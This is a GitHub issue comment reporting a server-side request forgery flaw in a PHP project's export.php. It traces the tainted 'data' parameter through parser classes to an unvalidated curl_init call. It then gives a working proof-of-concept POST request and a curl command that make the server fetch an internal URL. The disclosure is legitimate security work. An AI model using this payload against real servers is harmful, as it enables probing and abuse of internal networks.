### **[zer0yu](/zer0yu)** commented [May 25, 2022](#issue-1248017752)

| Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make requests to an unintended location.  Impact version: v1.3.5 Test with PHP 7.2  The vulnerable code is located in the `init` function of the `native-support/archive/src/ImageCapture.class.php` file, which does not sufficiently validate the image parameter, leading to a taint introduced from the `native-support/export.php` file in the `$_REQUEST['data']` variable in the `native-support/export.php` file and eventually enters the tainted function `curl_init`, which, after the `curl_exec` function is executed, sends a request to the URL specified by the image parameter, eventually leading to an SSRF vulnerability.  The function call path is as follows.  ``` file: native-support/export.php  code: $file = Parser::toXMind( $_REQUEST['data'] );  file: native-support/archive/src/Parser.class.php code: return XMindParser::parse( htmlspecialchars( $source, ENT_NOQUOTES ), $previewImage );  file: native-support/archive/src/Parser.xmind.class.php code: $data = self::doParse( $sourceJSON );  file: native-support/archive/src/Parser.xmind.class.php code: 'topic' => self::parseTopic( $source, $attachments )  file: native-support/archive/src/Parser.xmind.class.php code: self::parseImage( $source, $attachments );  file: native-support/archive/src/Parser.xmind.class.php code: $image = ImageCapture::capture( $source[ 'data' ][ 'image' ] );  file: native-support/archive/src/ImageCapture.class.php code: $curl = self::init( $url );  ```  The vulnerable function `init`  ``` private static function init ( $url ) {      $curl = curl_init( $url );      curl_setopt( $curl, CURLOPT_AUTOREFERER, true );     curl_setopt( $curl, CURLOPT_FOLLOWLOCATION, true );     curl_setopt( $curl, CURLOPT_RETURNTRANSFER, true );     curl_setopt( $curl, CURLOPT_RETURNTRANSFER, true );      // 尝试连接时间 10s     curl_setopt( $curl, CURLOPT_RETURNTRANSFER, 10 * 1000 );     curl_setopt( $curl, CURLOPT_MAXREDIRS, 5 );     curl_setopt( $curl, CURLOPT_TIMEOUT, 30 );      return $curl;  } ```  Because the `image` parameter is unrestricted, it is also possible to use the server side to send requests, such as probing intranet web services. The corresponding PoC is as follows  ``` POST /export.php HTTP/1.1 Host: 172.16.119.1:81 Content-Length: 64 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://172.16.119.1:81 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://172.16.119.1:81/export.php Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close  type=xmind&data={"data":{"image":"http://172.16.119.1/testpoc"}}  ```  You can also use the following curl command to verify the vulnerability  ``` curl -i -s -k -X $'POST' \     -H $'Host: 172.16.119.1:81' -H $'Content-Length: 64' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Connection: close' \     --data-binary $'type=xmind&data={\"data\":{\"image\":\"http://172.16.119.1/testpoc\"}}' \     $'http://172.16.119.1:81/export.php'  ```  [image](https://user-images.githubusercontent.com/16551733/170261033-054876cb-2a66-4b10-ba48-63168c7f1d0f.png) |
